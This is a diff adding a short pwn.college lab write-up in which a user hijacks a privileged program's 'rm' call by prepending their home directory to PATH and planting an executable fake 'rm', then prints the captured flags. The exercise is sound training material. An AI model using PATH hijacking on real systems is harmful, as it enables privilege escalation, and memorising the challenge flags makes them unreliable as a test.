@@ -37,3 +37,19 @@ Invoking 'win'....
 pwn.college{gKgqq9ACAySMr9z5md7b6EICvpl.dZzNyUDL3EzN0czW}
 hacker@path~adding-commands:~$ 
 
+
+
+# hijacking commands 
+hacker@path~hijacking-commands:~$ echo $PATH
+/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+hacker@path~hijacking-commands:~$ export PATH=/home/hacker/:$PATH
+hacker@path~hijacking-commands:~$ touch rm 
+hacker@path~hijacking-commands:~$ nano rm 
+hacker@path~hijacking-commands:~$ ls -l rm
+-rw-r--r-- 1 hacker hacker 11 Oct 19 17:13 rm
+hacker@path~hijacking-commands:~$ chmod a+x rm
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /home/hacker//rm. Executing!
+pwn.college{cPaLbp3Km7zSuwcAomZxfOAPsPl.ddzNyUDL3EzN0czW}
+
